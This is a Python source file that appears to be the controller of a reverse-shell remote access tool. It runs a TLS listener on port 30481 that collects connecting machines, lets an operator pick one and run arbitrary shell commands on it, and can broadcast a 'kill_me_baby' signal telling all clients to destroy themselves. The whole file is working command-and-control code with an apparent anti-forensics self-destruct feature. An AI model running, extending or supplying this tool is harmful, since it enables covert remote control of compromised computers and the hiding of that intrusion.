import ssl
import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal

NUMBER_THREADS = 10
JOB_NUMBERS = [1, 2]
queue = Queue()

is_exiting = False

COMMANDS = {
    'help': 'Shows this help',
    'list': 'Lists all connected clients',
    'select': 'Select particular client to interact',
    'kill_me_baby': 'Completely destroys connection with client. Sends signal to client to destroy itself',
    'quit_connection': 'Exits selected before connection with client',
    'kill_server': 'Shuts the server down'
}


class Server:
    def __init__(self, port, keyfile, certfile):
        self.host = '0.0.0.0'
        self.port = port
        self.socket = None
        self.keyfile = keyfile
        self.certfile = certfile
        self.connections = []
        self.addresses = []

    @staticmethod
    def get_prompt_by_addr(addr):
        result = '{}({}:{})\n'.format(addr[-1], addr[0], addr[1])
        return result

    def get_prompt_by_connection(self, connection):
        for i, conn in enumerate(self.connections):
            if conn == connection:
                return self.get_prompt_by_addr(self.addresses[i])
        return "ERROR"

    @staticmethod
    def show_help():
        for cmd, s in COMMANDS.items():
            print('{}:\t{}'.format(cmd, s))

    @staticmethod
    def read_socket(connection, n):
        data = b''
        while len(data) < n:
            packet = connection.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_server)
        signal.signal(signal.SIGTERM, self.quit_server)

    def quit_server(self, signal=None, frame=None):
        print('\nQuitting')
        global is_exiting
        is_exiting = True
        for connection in self.connections:
            try:
                connection.shutdown(2)
                connection.close()
            except Exception as e:
                print('Error closing connection: {}'.format(e))

        self.socket.close()
        sys.exit()

    def create_socket(self):
        try:
            uncrypted_socket = socket.socket()
            self.socket = ssl.wrap_socket(sock=uncrypted_socket,
                                          keyfile=self.keyfile,
                                          certfile=self.certfile,
                                          server_side=True)
        except socket.error as e:
            print('Error creating socket: {}'.format(e))
            sys.exit(1)

        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def bind_socket(self):
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(100)
        except socket.error as e:
            print('Error binding socket: {}'.format(e))
            time.sleep(5)
            self.bind_socket()

    def accept_connections(self):
        for connection in self.connections:
            connection.close()

        self.connections = []
        self.addresses = []

        while True:
            if is_exiting:
                break
            try:
                connection, address = self.socket.accept()
                connection.setblocking(1)
                client_hostname = connection.recv(1024).decode()
                address += client_hostname,
            except Exception as e:
                print('Error accepting connection: {}'.format(e))
                continue
            self.connections.append(connection)
            self.addresses.append(address)
            print('Connection with {} established!'.format(self.get_prompt_by_addr(address)))

    def start_local_interactive(self):
        while True:
            if is_exiting:
                break
            command = input('local> ').strip()
            if command == 'list':
                self.list_connections()
            elif command.startswith('select'):
                target, conn = self.select_target(command)
                if conn:
                    self.send_commands(target, conn)
            elif command == 'help':
                self.show_help()
            elif command == 'emergency':
                for conn in self.connections:
                    conn.send(b'kill_me_baby')
                self.quit_server()
            elif command == 'kill_server':
                self.quit_server()

    def list_connections(self):
        results = ''
        for i, connection in enumerate(self.connections):
            try:
                connection.send(b'blank')
                connection.recv(1024)
            except:
                del self.connections[i]
                del self.addresses[i]
                continue
            addr = self.addresses[i]
            results += '{}:\t{}\n'.format(i, self.get_prompt_by_addr(addr))
        print('Clients: \n{}'.format(results))

    def select_target(self, cmd):
        try:
            target = cmd.split()[-1]
            target = int(target)
            connection = self.connections[target]
        except IndexError:
            print('Target not provided or invalid')
            return None, None
        except ValueError:
            print('Target must be an integer')
            return None, None

        print('Connected to {}'.format(self.get_prompt_by_addr(self.addresses[target])))
        return target, connection

    def read_socket_output(self, connection):
        raw_len = self.read_socket(connection, 4)
        if not raw_len:
            return None
        message_len = struct.unpack('>I', raw_len)[0]
        return self.read_socket(connection, message_len)

    def send_commands(self, target, connection):
        print('Starting interaction')
        connection.send(b'blank')
        cwd = self.read_socket_output(connection).decode().strip()
        cwd = "{}:{} $ ".format(self.get_prompt_by_connection(connection), cwd)
        while True:
            if is_exiting:
                break
            print(cwd, end='')
            try:
                cmd = input().strip()
                if not len(cmd):
                    continue
                if cmd.startswith('shell cd'):
                    connection.send(cmd.encode())
                    result = self.read_socket_output(connection).decode()
                    if 'error' in result.lower():
                        print(result)
                    else:
                        connection.send(b'blank')
                        cwd = self.read_socket_output(connection).decode().strip()
                        cwd = "{}:{} $ ".format(self.get_prompt_by_connection(connection), cwd)
                elif cmd.startswith('quit_connection'):
                    return
                else:
                    connection.send(cmd.encode())
                    output = self.read_socket_output(connection).decode()
                    print(output)
            except Exception as e:
                print('Error sending command: {}. Connection lost'.format(e))
                break
        del self.connections[target]
        del self.addresses[target]


def work(server):
    while True:
        if is_exiting:
            break
        x = queue.get()
        if x == 1:
            server.create_socket()
            server.bind_socket()
            server.accept_connections()
        if x == 2:
            server.start_local_interactive()
        queue.task_done()


def create_workers():
    server = Server(port=30481, keyfile='server.key', certfile='server.crt')
    server.register_signal_handler()
    for _ in range(NUMBER_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()


def create_jobs():
    for x in JOB_NUMBERS:
        queue.put(x)
    queue.join()


def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
